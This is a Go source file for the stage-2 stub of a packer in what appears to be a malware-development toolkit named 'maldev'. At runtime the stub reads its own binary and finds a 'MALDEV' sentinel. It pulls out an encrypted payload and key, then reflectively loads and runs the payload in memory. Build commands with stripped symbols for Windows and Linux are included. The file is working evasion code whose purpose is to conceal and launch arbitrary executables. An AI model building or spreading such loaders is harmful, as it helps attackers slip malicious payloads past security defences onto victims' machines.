//go:build ignore

// stage2_main.go is the cross-platform source of the pe/packer/stubgen
// stage-2 stubs. The compiled binary is committed to the repo as
// stage2_vNN.exe (Windows) or stage2_linux_vNN (Linux). It is excluded
// from `go build ./...` by the //go:build ignore tag above; use the
// Makefile to build variants.
//
// Cross-platform: Phase 1e-A produced stage2_v01.exe (Windows PE32+);
// Phase 1e-B produces stage2_linux_v01 (Linux ELF64 static-PIE).
// runtime.LoadPE dispatches to the correct mapper on each OS via Phase
// 1f Stage C+D (Windows) and Stage E (Linux), so the stage-2 source
// itself requires no OS-specific branching.
//
// At runtime stage 2:
//  1. Locates the encrypted payload trailer via the sentinel bytes
//     the packer rewrites at pack-time.
//  2. Reads payload length + key length from the 16 bytes immediately
//     after the sentinel (two little-endian u64 values).
//  3. Extracts payload + AEAD key from the bytes that follow.
//  4. Calls runtime.LoadPE to reflectively load and execute the
//     original payload via JMP to its OEP.
//
// Sentinel (stubgen.go — must use the same value):
//
//	[4D 41 4C 44 45 56 01 01 50 59 31 45 30 30 41 00]  ("MALDEV\x01\x01PY1E00A\x00")
//
// Trailer layout appended at pack-time:
//
//	[16 bytes sentinel] [u64 payloadLen LE] [u64 keyLen LE] [payload] [key]
//
// Build (Windows):
//
//	CGO_ENABLED=0 GOOS=windows GOARCH=amd64 \
//	  go build -trimpath \
//	  -ldflags='-s -w -buildid=' \
//	  -o stage2_v01.exe ./stage2_main.go
//
// Build (Linux):
//
//	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
//	  go build -trimpath -buildmode=pie \
//	  -ldflags='-s -w -buildid=' \
//	  -o stage2_linux_v01 ./stage2_main.go
package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"os"

	pkgrt "github.com/oioio-space/maldev/pe/packer/runtime"
)

// sentinel is the 16-byte magic the packer searches for when appending the
// payload trailer. Each byte is a valid hex literal — see the build
// comment above for the human-readable interpretation.
//
// Task 8's stubgen.go MUST declare an identical value so PackBinary can
// locate the patch point.
var sentinel = [16]byte{
	0x4D, 0x41, 0x4C, 0x44, 0x45, 0x56, 0x01, 0x01,
	0x50, 0x59, 0x31, 0x45, 0x30, 0x30, 0x41, 0x00,
}

// findSentinel locates sentinel in self and returns the offset immediately
// after it — the start of the two u64 length fields. bytes.Index is used
// rather than a hand-rolled loop because we execute this exactly once at
// process start and readability matters more than micro-optimisation here.
func findSentinel(self []byte) (int, error) {
	i := bytes.Index(self, sentinel[:])
	if i < 0 {
		return 0, fmt.Errorf("stage2: sentinel not found — binary was not packed")
	}
	return i + len(sentinel), nil
}

func main() {
	exePath, err := os.Executable()
	if err != nil {
		fmt.Fprintln(os.Stderr, "stage2: os.Executable:", err)
		os.Exit(2)
	}
	self, err := os.ReadFile(exePath)
	if err != nil {
		fmt.Fprintln(os.Stderr, "stage2: read self:", err)
		os.Exit(2)
	}

	off, err := findSentinel(self)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(2)
	}

	if off+16 > len(self) {
		fmt.Fprintln(os.Stderr, "stage2: trailer truncated before length fields")
		os.Exit(2)
	}
	payloadLen := binary.LittleEndian.Uint64(self[off : off+8])
	keyLen := binary.LittleEndian.Uint64(self[off+8 : off+16])
	if payloadLen == 0 || keyLen == 0 {
		fmt.Fprintln(os.Stderr, "stage2: zero-length payload or key — binary was not packed")
		os.Exit(2)
	}

	dataOff := off + 16
	totalData := payloadLen + keyLen
	if uint64(dataOff)+totalData > uint64(len(self)) {
		fmt.Fprintln(os.Stderr, "stage2: payload+key extend past EOF")
		os.Exit(2)
	}
	payload := self[dataOff : uint64(dataOff)+payloadLen]
	key := self[uint64(dataOff)+payloadLen : uint64(dataOff)+totalData]

	img, err := pkgrt.LoadPE(payload, key)
	if err != nil {
		fmt.Fprintln(os.Stderr, "stage2: LoadPE:", err)
		os.Exit(2)
	}
	if err := img.Run(); err != nil {
		fmt.Fprintln(os.Stderr, "stage2: Run:", err)
		os.Exit(2)
	}
}
